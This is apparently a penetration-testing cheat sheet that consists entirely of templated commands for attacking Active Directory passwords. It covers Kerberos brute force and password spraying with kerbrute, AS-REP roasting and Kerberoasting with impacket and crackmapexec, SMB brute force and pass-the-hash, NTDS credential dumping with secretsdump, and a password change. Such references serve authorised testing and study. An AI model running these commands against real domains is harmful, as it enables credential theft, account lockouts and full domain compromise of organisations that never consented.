# Passwords
## Kerberos
Brute force passwords - WILL LOCKOUT USER:
```bash
kerbrute bruteuser --dc <IP> -d <DOMAIN> <PASSLIST> '<USER>'
```

Check a password for userlist:
```bash
kerbrute passwordspray --dc <IP> -d <DOMAIN> -v <USERLIST> '<PASS>'
```

AS-REP (AS-REP Roasting):
```bash
impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -usersfile <USERLIST>
impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request
crackmapexec ldap <IP> --kdcHost <IP> -u '<USER>' -p '<PASS>' --asreproast <OUTPUT>
```

TGS-REP (Kerberoasting):
```bash
impacket-GetUserSPNs -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request
crackmapexec ldap <IP> --kdcHost <IP> -u '<USER>' -p '<PASS>' --kerberoasting <OUTPUT>
```

## SMB
Brute force passwords - WILL LOCKOUT USER:
```bash
crackmapexec smb <IP> -u '<USER>' -p <PASSLIST>
crackmapexec smb <IP> -u '<USER>' -H <HASHES>
```

Check password for users in list:
```bash
crackmapexec smb <IP> -u <USERLIST> -p '<PASS>'
```

If you have admin rights. Dump NTDS file:
```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<IP>'
```

Change password user:
```bash
smbpasswd -U '<USER>' -r <DC_IP>
```